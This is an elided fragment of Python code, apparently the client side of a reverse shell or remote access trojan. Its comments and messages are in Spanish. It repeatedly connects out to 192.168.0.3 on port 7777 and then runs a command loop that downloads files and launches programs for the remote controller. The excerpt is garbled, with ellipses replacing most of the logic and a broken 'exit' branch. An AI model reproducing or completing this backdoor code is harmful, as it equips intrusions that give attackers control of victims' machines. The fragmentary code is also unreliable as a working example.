...
def connection():
    while True:
        time.sleep(5)
        try:
            cliente.connect(("192.168.0.3", 7777))
            shell()
        except:
            connection()
...
def shell():
    ...
    while True:
        ...
        if res == "exit":
            ...
            try:
                download_file(res[4:])
                cliente.send("Se descargo el archivo correctamente.")
            except:
                cliente.send("Ha ocurrido un error al intentar descargar el archivo.")
            ...
            try:
                ...
                cliente.send("Se inicio el programa exitosamente")
            except:
            ...
            try:
                ...
                cliente.send("No se ha podido realizar la tarea")
        else:
